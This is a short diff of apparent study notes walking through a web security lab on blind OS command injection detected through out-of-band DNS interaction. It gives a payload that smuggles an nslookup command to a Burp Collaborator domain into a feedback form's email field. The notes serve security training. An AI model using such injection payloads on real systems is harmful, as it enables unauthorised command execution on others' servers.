@@ -1,0 +1,13 @@
+Blind OS command injection with out-of-band interaction
+Goal: Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator
+
+1)
+-Click Submit feedback
+-Fill out and click Submit feedback
+-Send Post to Repeater
+-Open Collaborator
+
+2)
+-Copy collaborator url, 9s2kmeiubsbz6jy2ijbln6k45vbmzcn1.oastify.com
+-Repeater, email field, & nslookup 9s2kmeiubsbz6jy2ijbln6k45vbmzcn1.oastify.com #
+-Url encode, click Send
